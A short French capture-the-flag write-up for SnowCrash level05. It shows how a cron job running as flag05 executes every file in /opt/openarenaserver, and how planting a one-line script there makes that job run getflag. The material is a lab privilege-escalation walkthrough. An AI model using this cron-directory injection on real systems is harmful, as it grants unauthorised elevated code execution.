# Level 05

Quand on se connecte au compte `level05` on voit un message qui dit `You have new mail.`<br>
les mails sont stockés dans `/var/mail/$USER`

```sh
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

C'est un cronjob qui execute `sh /usr/sbin/openarenaserver` en tant que `flag05` toutes les 2 minutes

```sh 
level05@SnowCrash:/tmp$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

C'est un script qui execute tous les fichiers contenus dans /opt/openarenaserver puis les supprime

On crée un exploit qui va lui faire exécuter getflag et stocker le résultat dans un fichier txt: ```echo 'getflag >> /tmp/flag.txt' > /opt/openarenaserver/exploit.sh```

Au bout de quelques minutes, on fait `cat /tmp/flag.txt`, et on obtient le flag